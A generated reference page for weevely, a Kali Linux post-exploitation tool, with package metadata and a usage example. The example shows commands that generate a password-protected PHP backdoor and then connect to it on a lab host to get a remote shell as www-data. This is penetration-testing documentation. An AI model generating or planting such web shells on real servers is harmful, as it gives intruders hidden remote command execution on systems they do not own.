---
tool_id: weevely
title: weevely
categories: ["post-exploitation"]
category_slugs: ["post-exploitation"]
homepage: https://github.com/epinna/weevely3/
repository: 
version: 4.0.2-1
architectures: all
license: 
binaries: []
metapackages: ["kali-linux-default kali-linux-everything kali-linux-headless kali-linux-large kali-tools-post-exploitation kali-tools-web"]
icon: images/weevely-logo.svg
source_path: kali-tools\weevely\index.md
source_commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
generated_at: 2026-01-03T15:46:07.167549
---

# Tool: weevely (weevely)

## Categories
- [post-exploitation](../post-exploitation.md)


## Quick Facts
| Field | Value |
| --- | --- |
| Homepage | [https://github.com/epinna/weevely3/](https://github.com/epinna/weevely3/) |
| Repository |  |
| Version | 4.0.2-1 |
| Architectures | all |
| License |  |
| Binaries |  |
| Metapackages | kali-linux-default kali-linux-everything kali-linux-headless kali-linux-large kali-tools-post-exploitation kali-tools-web |
| Icon | images/weevely-logo.svg |

## Install
*(No installation information found)*

## Official Info (Extracted)
- **Repository**: https://salsa.debian.org/pkg-security-team/weevely
- **PackagesInfo**: |
- ****Installed size**: ** `899 KB`
- ****How to install**: ** `sudo apt install weevely`
- **{{< spoiler "Dependencies**: " >}}
- **root@kali**: ~# weevely -h
- **usage**: weevely [-h] {terminal,session,generate} ...
- **positional arguments**: []
- **options**: []


## Documentation (Upstream)

{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## weevely Usage Example

Generate a PHP backdoor (`generate`) protected with the given password (`s3cr3t`).

```console
root@kali:~# weevely generate s3cr3t
[generate.php] Backdoor file 'weevely.php' created with password 's3cr3t'
root@kali:~# weevely http://192.168.1.202/weevely.php s3cr3t
      ________                     __
     |  |  |  |----.----.-.--.----'  |--.--.
     |  |  |  | -__| -__| |  | -__|  |  |  |
     |________|____|____|___/|____|__|___  | v1.1
                                     |_____|
              Stealth tiny web shell

[+] Browse filesystem, execute commands or list available modules with ':help'
[+] Current session: 'sessions/192.168.1.202/weevely.session'

www-data@kali:/var/www $ uname
Linux
www-data@kali:/var/www $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


## Source
- Path: kali-tools\weevely\index.md
- Commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
- Generated at: 2026-01-03T15:46:07.167549
